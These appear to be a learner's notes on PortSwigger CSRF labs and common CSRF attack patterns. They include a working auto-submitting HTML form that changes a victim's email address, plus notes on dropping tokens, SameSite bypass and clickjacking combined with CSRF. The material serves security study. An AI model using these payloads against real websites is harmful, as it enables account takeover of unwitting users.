# CSRF Attack Techniques

## PortSwigger Lab Solutions

### Lab: CSRF where token validation depends on token being present
**Status**: Vulnerability confirmed (not fully solved due to browser SameSite)

**Vulnerability**: Server only validates CSRF token when it's present in request

**Exploit**:
```html
<form method="POST" action="https://TARGET/my-account/change-email">
  <input type="hidden" name="email" value="pwned@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

**Key Lesson**: Always test removing CSRF token entirely (not just changing it)

## CSRF Attack Patterns

### 1. No CSRF Token
```html
<form method="POST" action="https://TARGET/action">
  <input type="hidden" name="param" value="value">
</form>
<script>document.forms[0].submit()</script>
```

### 2. Token in Body (Not Validated)
```
# Remove csrf parameter entirely
POST /action
param=value
```

### 3. Token Tied to Session
```
# Use victim's session token in exploit
# Login as attacker, get valid token
# Token may work across sessions
```

### 4. SameSite Cookie Bypass
```
# If SameSite=None, cross-site POST works
# If SameSite=Lax, only GET requests work from cross-site
# Use GET-based CSRF if endpoint accepts GET
```

### 5. Clickjacking + CSRF
```
# Combine clickjacking with CSRF
# Iframe the target page, trick user into clicking
# The click submits the CSRF form
```
